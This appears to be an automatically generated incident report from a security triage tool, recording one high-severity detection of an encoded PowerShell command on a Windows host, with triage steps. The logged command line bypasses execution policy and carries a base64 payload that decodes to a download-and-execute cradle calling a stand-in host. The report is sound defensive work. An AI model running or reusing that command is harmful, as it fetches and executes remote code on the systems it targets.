# Incident Report: Automated triage

**Generated:** 2026-08-31T00:04:29Z
**Detections fired:** 1

## Summary

1 detection(s) fired. Highest severity: **high**.

## Findings

### 1. Suspicious PowerShell Encoded Command  (`bf-0001`)

- **Severity:** high
- **MITRE ATT&CK:** T1059.001
- **Host / User:** Fable / WIN-2N9OV016O6B\\Fable
- **Timestamp:** 2026-08-31 00:02:04.890000+00:00
- **Process:** `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`
- **Command line:** `\"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -ExecutionPolicy Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtACcAKQA=`
> PowerShell launched with an encoded command (-enc / -EncodedCommand). Attackers base64-encode payloads to hide intent and bypass simple string-based controls.

## Recommended next steps

1. Validate whether the activity is expected for this host and user.
2. Pivot on the extracted IOCs (reputation lookups, other hosts touching them).
3. If confirmed malicious, isolate the host and follow the relevant playbook in `docs/`.